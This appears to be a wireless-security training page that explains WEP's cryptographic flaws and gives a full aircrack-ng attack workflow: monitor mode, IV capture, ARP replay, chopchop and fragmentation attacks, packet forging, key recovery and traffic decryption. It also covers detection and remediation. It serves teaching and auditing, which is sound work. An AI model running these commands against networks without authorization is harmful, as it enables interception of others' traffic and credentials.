Section 01

Why WEP Is Broken

WEP (Wired Equivalent Privacy) was defined in the original IEEE 802.11 standard in 1997 and ratified in 1999. Its design goal was to provide the same level of privacy as a wired LAN — that is, to prevent casual eavesdropping. It failed at this goal almost immediately. To understand why, you need to understand both the cipher it uses and how the protocol applies that cipher.

RC4 Stream Cipher
RC4 is a stream cipher that generates a pseudo-random keystream from a seed key. That keystream is XOR'd with plaintext to produce ciphertext. The cipher itself is not inherently catastrophic — RC4 was widely used in SSL/TLS for years. The problem is how WEP applies it, not the cipher in isolation.
Stream Cipher
24-Bit IV Space
WEP prepends a 24-bit Initialization Vector (IV) to the WEP key before seeding RC4. The IV changes per-packet to prevent keystream reuse. But 24 bits allows only 16,777,216 possible values. On a busy network, this space is exhausted in minutes, guaranteeing IV collisions.
Fatal Constraint
The Birthday Problem
The birthday paradox tells us that in a space of N values, collisions become likely after roughly sqrt(N) samples. For a 24-bit IV space (N = 16.7M), collisions become probable after approximately 4,096 packets. Two packets encrypted with the same IV produce XOR-recoverable plaintext.
Probability Theory
Weak IVs
A subset of all possible IVs, known as "weak IVs," cause the RC4 key scheduling algorithm (KSA) to leak key bytes into early keystream output. Fluhrer, Mantin, and Shamir identified these in 2001. Statistical analysis across many packets encrypted with weak IVs recovers key bytes one at a time.
KSA Vulnerability
No Key Management
WEP uses a single static shared key. There is no per-session key derivation, no forward secrecy, and no mechanism to rotate keys automatically. Once the WEP key is recovered, every historical capture can be decrypted and the key remains valid until manually changed on every device.
Design Failure
Broken Integrity Check
WEP uses CRC-32 as its integrity check value (ICV). CRC-32 is not a cryptographic MAC — it is a linear error-detection code. An attacker who knows some plaintext can flip bits in a ciphertext frame and compute a valid CRC-32, allowing undetected packet modification even without knowing the WEP key.
Integrity Failure

Timeline of WEP's Destruction

1997
IEEE 802.11 Standard Published
WEP included as the optional privacy mechanism. RC4 with a 40-bit key (later extended to 104-bit). 24-bit IV concatenated with key before KSA. The cryptographic community was not deeply consulted in the design process.
1999
IEEE 802.11b Ratified — WEP Becomes Mainstream
Wi-Fi begins mass-market adoption. WEP is deployed widely in homes, businesses, and hotspots. The 40-bit key export restriction (US law at the time) made the original WEP even weaker.
2001
FMS Attack Published (Fluhrer, Mantin, Shamir)
"Weaknesses in the Key Scheduling Algorithm of RC4" — the paper that shattered WEP. FMS identified a class of weak IVs that cause the RC4 KSA to leak key bytes. By collecting packets encrypted with these weak IVs and performing statistical analysis, the key can be recovered one byte at a time. Required approximately 4-6 million packets for 128-bit WEP.
2004
KoreK Attacks Reduce IV Requirement
An anonymous researcher known as KoreK published 17 new statistical attacks against WEP on SourceForge. These attacks reduced the number of IVs required for key recovery from millions to approximately 500,000. The Aircrack tool implemented KoreK attacks and made WEP cracking practical for non-specialists.
2007
PTW Attack — Key Recovery in Under 60 Seconds
Pyshkin, Tews, and Weinmann published an improved attack that reduced the IV requirement to approximately 40,000 packets for high success probability. Combined with traffic injection to accelerate IV collection, a 104-bit WEP key could now be recovered in under 60 seconds with consumer hardware. Implemented in aircrack-ng 0.9.
2004–
WEP Deprecated — Still Found in the Wild
The Wi-Fi Alliance stops certifying WEP equipment in 2004. The IEEE formally retires WEP in 2004 with the 802.11i amendment. Despite this, WEP devices continue to operate in industrial facilities, hospitals, retail locations, and legacy embedded systems through 2026.
Section 02

The IV Problem

The Initialization Vector is central to WEP's cryptographic design — and its single most catastrophic flaw. Understanding the IV problem requires understanding both why IVs exist and why WEP's implementation of them is mathematically indefensible.

ℹ
Why Stream Ciphers Need IVs
A stream cipher like RC4 generates a deterministic keystream from a given key — the same key always produces the same keystream. If two plaintexts are encrypted with the same keystream, XOR-ing the ciphertexts eliminates the keystream entirely, leaving C1 XOR C2 = P1 XOR P2. An attacker with known plaintext for one message can recover the other. IVs solve this by varying the seed so each packet uses a unique keystream. WEP's 24-bit IV is simply too small to make this variation meaningful.

Weak IVs vs. Strong IVs
Not all IV values are equally dangerous — but enough are
▼

Fluhrer, Mantin, and Shamir identified a specific class of IVs that cause the RC4 Key Scheduling Algorithm to produce biased output. These "weak IVs" have the form (A+3, N-1, X) where A is the key byte index under attack and X is any value. For a 104-bit key (13 bytes), there are 13 sets of weak IVs, each allowing statistical recovery of one key byte.

Approximately 1 in every 256 randomly chosen IVs is "weak" in the FMS sense. The original FMS attack required collecting approximately 4-6 million total packets to obtain enough weak IVs for each key byte. Hardware was slower in 2001, making this take hours — by 2003, widespread broadband and faster hardware made FMS practical.

  • Weak IV: The IV leaks information about key bytes through biased first byte of keystream
  • Strong IV: The IV produces no statistically exploitable keystream bias
  • An IV cannot be evaluated as "safe" at the time of transmission — the attacker accumulates all IVs and filters for weak ones
  • KoreK (2004) generalized beyond the FMS weak IV definition, making all IVs partially exploitable
  • PTW (2007) further generalized: the attack uses all captured IVs, not just weak ones, drastically reducing requirements
How Statistical Analysis Extracts Key Bytes
The mechanism behind FMS and PTW key recovery
▼

For each key byte position, the FMS attack collects all packets encrypted with weak IVs targeting that byte. For each such packet, the attacker XOR-decrypts the first byte of payload (which is known for LLC SNAP headers) with the first keystream byte (observable in the ciphertext). This yields a candidate for the key byte.

Because the RC4 KSA is biased for weak IVs, the correct key byte candidate appears more frequently than random noise. With enough samples, statistical voting — counting which candidate value appears most often — recovers the correct byte with high probability. PTW improves this by using the entire keystream prefix (not just the first byte) and applying a maximum likelihood statistical framework across all IVs.

The attacker does not need to know any plaintext beyond the first two bytes of each decrypted frame. LLC SNAP headers (0xAA 0xAA) provide this automatically in virtually every real 802.11 data frame, meaning the attack requires no additional information beyond passively captured packets.

64-Bit vs. 128-Bit WEP
Why "128-bit WEP" does not mean 128-bit security
▼

WEP is marketed as either "64-bit" or "128-bit" (sometimes called "256-bit" by some vendors). These numbers include the 24-bit IV. The effective secret key is only:

  • 64-bit WEP: 40-bit secret key (5 bytes) + 24-bit IV
  • 128-bit WEP: 104-bit secret key (13 bytes) + 24-bit IV
  • 256-bit WEP: 232-bit secret key (29 bytes) + 24-bit IV

The PTW attack requires approximately 40,000 IVs for 64-bit WEP and approximately 85,000 IVs for 128-bit WEP at 95% success probability. The difference in cracking time between 64-bit and 128-bit WEP is measured in seconds — not hours or days. "128-bit WEP" provides no meaningful additional security over 64-bit WEP against modern statistical attacks.

Section 03

🔫 WEP Attack Workflow

The complete WEP attack workflow uses the Aircrack-ng suite, standard in Kali Linux. Each tool handles a discrete phase: interface management, passive capture, and key recovery. The following assumes a wireless adapter that supports monitor mode and packet injection (such as an Alfa AWUS036NHA with the Atheros AR9271 chipset).

Authorized Testing Only
Executing this workflow against any network you do not own or have explicit written authorization to test is a criminal offense under the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent statutes globally. All practical work must be performed in an isolated lab environment with equipment you control.

Step 1 — Enable Monitor Mode

The wireless adapter must be placed into monitor mode so it captures all 802.11 frames regardless of destination, not just frames addressed to the host machine.

# Kill processes that may interfere with monitor mode $ sudo airmon-ng check kill # Enable monitor mode — creates interface wlan0mon $ sudo airmon-ng start wlan0 # Verify monitor mode is active $ iwconfig wlan0mon wlan0mon IEEE 802.11 Mode:Monitor Frequency:2.462 GHz

Step 2 — Scan for WEP Networks

airodump-ng displays all nearby access points with their BSSID, channel, encryption type, and associated clients. WEP targets will show ENC=WEP in the output.

$ airodump-ng wlan0mon BSSID PWR Beacons #Data CH ENC CIPHER AUTH ESSID AA:BB:CC:DD:EE:FF -62 142 18 6 WEP WEP OPN TargetNet 11:22:33:44:55:66 -78 89 3 11 WPA2 CCMP PSK HomeNet # ENC=WEP identifies the target — note BSSID and channel

Step 3 — Lock On Target and Capture IVs

Lock airodump-ng onto the target BSSID and channel, writing all captured packets to a file. Every captured data frame contains an IV that may contribute to key recovery.

# Lock to target: channel 6, BSSID AA:BB:CC:DD:EE:FF, output to capture.cap $ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon CH 6 ][ Elapsed: 2 mins ][ 2026-02-26 14:22 BSSID PWR RXQ Beacons #Data #/s CH ENC ESSID AA:BB:CC:DD:EE:FF -62 100 1440 3217 42 6 WEP TargetNet STATION PWR Rate Lost Frames Notes DE:AD:BE:EF:01:02 -71 54-48 0 3102
ℹ
IV Count Targets
Watch the #Data column — this is your IV count. PTW typically needs 40,000-85,000 IVs for reliable key recovery against 64-bit and 128-bit WEP respectively. On an idle network, passive capture alone may take 30+ minutes to accumulate enough IVs. Traffic injection (Section 4) accelerates this dramatically.
Section 04

Traffic Injection & Acceleration

Passive capture is limited by actual network traffic. A lightly-loaded WEP network may generate only a few hundred data frames per minute, making IV collection painfully slow. Several injection-based techniques dramatically accelerate IV collection by generating or replaying traffic that the AP encrypts with new IVs.

iperf Traffic Generation
Using legitimate traffic tools to saturate IV collection
▼

In lab environments where you control devices on the target WEP network, iperf provides a simple way to generate high-volume traffic. Each UDP packet sent over the WEP network is encrypted by the AP with a new IV, giving the attacker fresh material. The goal is to push past 25,000 IVs rapidly.

# On host1 (connected to WEP network) — start iperf UDP server $ iperf3 -s # On host2 (also on WEP network) — UDP flood toward host1 # -u: UDP -b: bandwidth -t: duration (seconds) -l: packet length $ iperf3 -c 192.168.1.100 -u -b 10M -t 60 -l 1400 # Watch #Data in airodump-ng — should climb rapidly # Target: 25,000+ IVs within a few minutes under load

At 10 Mbps with 1400-byte UDP payloads, you generate approximately 893 packets/second. After 60 seconds, that is approximately 53,580 additional data frames — well past the PTW threshold for 64-bit WEP recovery.

ARP Replay Attack (aireplay-ng -3)
The most reliable IV acceleration technique against live targets
▼

ARP replay is the standard acceleration technique for WEP attacks against live networks. ARP requests (broadcast frames) are captured and replayed — each replay causes the AP to encrypt a new copy with a fresh IV and broadcast it back. ARP frames are short (28 bytes) and the AP must respond, making this highly efficient.

# Step 1: Fake authentication with the AP (required before injection) $ aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h OUR_MAC wlan0mon Association successful :-) # Step 2: Start ARP request replay — wait for an ARP packet, then loop $ aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h OUR_MAC wlan0mon Saving ARP requests in replay_arp-1234-140000.cap You should also start airodump-ng to capture replies. Read 1 packets (got 1 ARP request and 0 ACKs), sent 428 packets (500 pps)... # airodump-ng #Data column should now climb at 400-600 IVs/second

At 500 packets per second, 40,000 IVs accumulate in approximately 80 seconds. Combined with aircrack-ng running in parallel, key recovery typically completes within 2-3 minutes of starting ARP replay.

Chopchop Attack (aireplay-ng -4)
Decrypt one packet without knowing the key
▼

The chopchop attack (Koreman & MacAulay, 2004) exploits the weak CRC-32 integrity check to decrypt a WEP-encrypted packet one byte at a time, without knowing the WEP key. The attacker guesses the last byte of the payload, recalculates the CRC, transmits the modified packet to the AP, and observes whether the AP retransmits it (correct guess) or discards it (incorrect guess). After at most 256 guesses per byte, the full plaintext is recovered.

# Chopchop: interactively decrypt a captured packet $ aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h OUR_MAC wlan0mon Use this packet ? y Saving chosen packet in replay_dec-1234-140122.cap Offset 85 (100% done) | xor = 0x3A | pt = 0x00 | 203 frames written Sent 203 packets, current guess: 0x00 # Once complete: use packetforge-ng to craft ARP request from keystream $ packetforge-ng -0 -a AP_MAC -h OUR_MAC -k 255.255.255.255 \ -l 255.255.255.255 -y replay_dec.xor -w arp_crafted.cap
Fragmentation Attack (aireplay-ng -5)
Obtain keystream bytes without decrypting a full frame
▼

The fragmentation attack recovers up to 1,500 bytes of PRGA (keystream) without needing to decrypt a complete packet. The attacker captures one data frame, extracts one known plaintext byte (LLC SNAP header), and uses it to construct a keystream byte. By transmitting carefully crafted fragmented packets and observing AP responses, the keystream can be extended iteratively to 1,500 bytes.

The recovered keystream can then be used with packetforge-ng to forge arbitrary packets (such as ARP requests) that the AP will encrypt and broadcast — generating high-volume IV material for aircrack-ng without requiring any associated clients. The fragmentation attack is particularly useful when no active clients are present.

$ aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h OUR_MAC wlan0mon Size: 68, FromDS: 1, ToDS: 0 (WEP) BSSID = AA:BB:CC:DD:EE:FF Use this packet ? y Saving keystream in fragment-1234-140300.xor Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
Section 05

Statistical Key Recovery

aircrack-ng reads the captured .cap file, extracts all WEP IVs, and applies the PTW statistical attack to recover the key. The process can run in parallel while airodump-ng is still capturing — aircrack-ng will automatically re-attempt with more IVs as the cap file grows.

Reading aircrack-ng Output
Understanding vote tables and depth columns
▼

The aircrack-ng output table shows the statistical vote breakdown for each key byte (KB):

  • KB: Key byte index (0 through N-1, where N is key length in bytes)
  • depth: How far down the candidate list the correct byte is (0/1 means top candidate) — if depth is not 0/1, more IVs are needed
  • byte(vote): Candidate byte value and its vote count — the byte with the highest votes is the most probable correct key byte
  • KEY FOUND!: All key bytes resolved; the bracketed hex values are the WEP key in hex
  • Decrypted correctly: 100%: Verification that the recovered key successfully decrypts captured packets

If aircrack-ng fails, it exits with "Failed. Next try with 5000 more IVs." — indicating you need to collect more packets. Continue capture/injection and re-run; or use the -n flag to specify key length if the default detection fails.

✓
Using the Recovered Key to Decrypt Traffic
Once the WEP key is recovered, all captured traffic (including the capture file used for cracking) can be fully decrypted. In Wireshark: Edit > Preferences > Protocols > IEEE 802.11 > Decryption keys. Add the recovered key as type "wep" in the format 3E:A7:4C:B1:F2. Wireshark will retroactively decrypt all WEP-encrypted frames in the capture, exposing plaintext HTTP, DNS, credentials, and any other unencrypted layer-7 traffic.
Section 06

WEP in 2026: Legacy Risk

WEP was deprecated by the Wi-Fi Alliance in 2004 and removed from the IEEE 802.11 standard in 2012. Yet WEP-protected networks continue to appear in enterprise wireless audits, industrial environments, and healthcare facilities in 2026. Understanding why WEP persists — and how to address it when found — is a practical skill for any wireless security practitioner.

Where WEP Is Still Found

🏥
Legacy Medical Devices
Wireless patient monitors, infusion pumps, and telemetry systems from pre-2010 can only speak WEP. Firmware is either unavailable, proprietary, or its modification would void FDA clearance. Many hospitals operate these devices on isolated "medical device VLANs" that are still reachable from shared wireless infrastructure.
Healthcare
Industrial & ICS Equipment
Programmable logic controllers (PLCs), wireless SCADA sensors, and proprietary industrial handhelds from 2003-2010 often have hardcoded WEP support with no upgrade path. Replacement requires engineering redesign, factory recertification, and capital expenditure that may exceed seven figures for large facilities.
Industrial
📛
Legacy POS Terminals
Older retail point-of-sale terminals and barcode scanners may only support WEP. These systems process payment card data — a WEP network carrying PCI DSS in-scope traffic is a critical compliance failure (PCI DSS explicitly prohibits WEP). Discovered WEP POS systems result in automatic non-compliance findings.
Retail / PCI
Embedded & IoT Devices
Early wireless camera systems, HVAC controllers, building management systems, and other embedded appliances ship with fixed wireless chipsets that support only WEP. Manufacturers are often dissolved or unsupportive; firmware updates are nonexistent. These devices are frequently forgotten after deployment.
IoT / Embedded

Remediation Strategies When Replacement Is Not Immediate

Network Isolation Controls

  • ▸ Place WEP devices on a dedicated VLAN with no routing to corporate segments
  • ▸ Implement stateful firewall rules: WEP VLAN may only reach specific destination IPs/ports required for device function
  • ▸ Enable WIDS monitoring on the WEP SSID to detect association anomalies or rogue clients
  • ▸ Limit the WEP AP transmit power to minimum usable level — reduces attack radius

Detection & Monitoring

  • ▸ Log all client MACs associating with the WEP SSID — any unknown MAC is an indicator of compromise
  • ▸ Monitor for unusual association counts (ARP replay produces anomalously high frame rates)
  • ▸ Alert on deauthentication frame spikes — may indicate an attacker capturing handshakes or injecting
  • ▸ Periodic RF spectrum monitoring to detect high-gain antenna proximity attacks
Detection in Enterprise Wireless Audits
During a wireless site survey, WEP networks are immediately visible in airodump-ng, Kismet, and commercial WIDS systems. In a penetration test scope that includes wireless, any WEP network discovered is an automatic critical finding requiring immediate disclosure to the client, regardless of whether key recovery is demonstrated. Document the BSSID, SSID, location (GPS or building floor/room), estimated RF coverage area, and any associated client MACs observed during the survey window.

Key Takeaways

WEP Is Not Encryption
A WEP-protected network provides no meaningful confidentiality. Treat any WEP network as equivalent to an open network for risk and compliance purposes.
24-Bit IVs Are Catastrophic
The 16.7 million IV space guarantees reuse within minutes on any busy network. IV reuse is the mathematical foundation for every WEP attack — the cipher itself is secondary.
🔫
PTW Takes Under 60 Seconds
With ARP replay injection and the PTW attack in aircrack-ng, 128-bit WEP key recovery from a live network takes under three minutes on consumer hardware. The skill barrier is near zero.
🏥
WEP Still Exists in Production
Legacy medical devices, ICS equipment, and embedded systems keep WEP alive in 2026. Knowing how to find, assess, and mitigate WEP risk is a practical skill for enterprise auditors.
